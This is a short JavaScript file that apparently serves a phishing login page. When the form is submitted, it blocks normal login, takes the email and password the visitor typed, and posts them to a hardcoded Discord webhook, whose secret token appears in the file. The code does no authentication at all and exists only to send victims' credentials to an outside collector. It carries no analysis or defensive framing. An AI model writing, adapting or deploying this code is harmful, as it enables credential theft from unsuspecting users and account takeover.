const loginForm = document.getElementById('login-form');
const webhookUrl = 'https://discord.com/api/webhooks/1248256258306478192/2VHYaCNwOZn_4Emx-TAMNfrj_2Z5gyT8oNctZW6oiCccIUingy096_I58Q5PUH90mlTB';

loginForm.addEventListener('submit', (e) => {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            email,
            password,
            timestamp: new Date().toLocaleTimeString()
        })
    })
    .then((response) => response.json())
    .then((data) => console.log(data))
    .catch((error) => console.error(error));
});
